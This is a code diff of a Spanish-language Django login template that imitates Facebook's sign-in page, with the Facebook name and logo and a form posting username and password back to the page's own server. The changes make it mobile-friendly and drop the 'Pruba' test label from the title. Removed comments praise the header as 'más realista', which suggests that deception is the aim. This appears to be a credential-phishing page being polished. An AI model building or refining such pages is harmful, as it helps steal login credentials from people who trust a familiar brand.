@@ -2,7 +2,11 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<title>Pruba - Iniciar sesión</title>
+
+<!-- 🔥 CLAVE -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title> Iniciar sesión</title>
 
 <style>
 body {
@@ -11,24 +15,28 @@ body {
     background-size: cover;
     background-position: center;
     margin: 0;
+    padding: 20px;
 }
 
+/* contenedor flexible */
 .container {
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
+    min-height: 100vh;
 }
 
+/* caja adaptable */
 .login-box {
     background-color: white;
-    padding: 40px;
-    border-radius: 8px;
+    padding: 30px 20px;
+    border-radius: 10px;
     box-shadow: 0 0 20px rgba(0,0,0,0.3);
-    width: 350px;
+    width: 100%;
+    max-width: 350px;
 }
 
-/* 🔥 HEADER MÁS REALISTA */
+/* header */
 .header {
     display: flex;
     align-items: center;
@@ -37,29 +45,25 @@ body {
     margin-bottom: 25px;
 }
 
-/* texto más tipo app */
 .title {
-    font-size: 20px;
+    font-size: 22px;
     font-weight: 600;
     color: #1877f2;
-    letter-spacing: 0.3px;
-    margin: 0;
 }
 
-/* logo más integrado */
 .logo {
-    width: 24px;
-    height: 24px;
-    object-fit: contain;
+    width: 26px;
+    height: 26px;
 }
 
+/* inputs y botón */
 .login-box form input, 
 .login-box form button {
     width: 100%;
-    padding: 12px;
-    margin: 8px 0;
-    border-radius: 6px;
-    font-size: 14px;
+    padding: 14px;
+    margin: 10px 0;
+    border-radius: 8px;
+    font-size: 16px;
     box-sizing: border-box;
 }
 
@@ -73,22 +77,39 @@ body {
     color: white;
     font-weight: bold;
     cursor: pointer;
-    font-size: 16px;
 }
 
-.login-box form button:hover {
-    background-color: #1e2f8a;
+/* hover solo en PC */
+@media (hover: hover) {
+    .login-box form button:hover {
+        background-color: #1e2f8a;
+    }
 }
 
 .forgot {
     text-align: center;
-    margin-top: 10px;
+    margin-top: 12px;
 }
 
 .forgot a {
     text-decoration: none;
     color: #2a3fb7;
     font-size: 14px;
+}
+
+/* 🔥 ajustes para móviles pequeños */
+@media (max-width: 480px) {
+    body {
+        padding: 15px;
+    }
+
+    .login-box {
+        padding: 25px 15px;
+    }
+
+    .title {
+        font-size: 20px;
+    }
 }
 </style>
 
@@ -98,16 +119,15 @@ body {
 <div class="container">
     <div class="login-box">
 
-        <!-- HEADER REALISTA -->
         <div class="header">
-            <span class="title">facebook</span>
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="logo">
+            <span class="title">FACEBOOK</span>
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png">
         </div>
 
         <form method="post">
             {% csrf_token %}
-            <input type="text" name="username" placeholder="Usuario o correo" autocomplete="off">
-            <input type="password" name="password" placeholder="Contraseña" autocomplete="off">
+            <input type="text" name="username" placeholder="Usuario o correo">
+            <input type="password" name="password" placeholder="Contraseña">
             <button type="submit">Iniciar sesión</button>
         </form>
 
